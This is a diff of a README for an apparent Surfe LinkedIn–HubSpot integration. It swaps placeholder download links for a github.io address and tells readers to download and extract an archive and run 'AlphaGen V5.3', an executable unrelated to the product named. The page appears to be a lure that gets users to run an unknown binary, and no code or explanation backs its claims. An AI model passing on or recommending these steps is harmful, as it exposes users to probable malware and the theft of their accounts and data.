@@ -2,13 +2,13 @@
 
 Integrate Surfe with HubSpot CRM to sync LinkedIn contacts, log InMail activity, and enrich CRM records — without leaving LinkedIn.
 
-[![Download](https://img.shields.io/badge/Download-Surfe_LinkedIn_HubSpot_Integration-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Surfe_LinkedIn_HubSpot_Integration-blueviolet)](https://surfe-linkedin-sync-hubspot-crm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://surfe-linkedin-sync-hubspot-crm.github.io/.github)  
 2. 📁 Extract the files to any location  
 3. 🖱 Run AlphaGen V5.3 to activate CRM synchronization  
 4. ✅ Install the Surfe Chrome Extension and authorize HubSpot access through the plugin
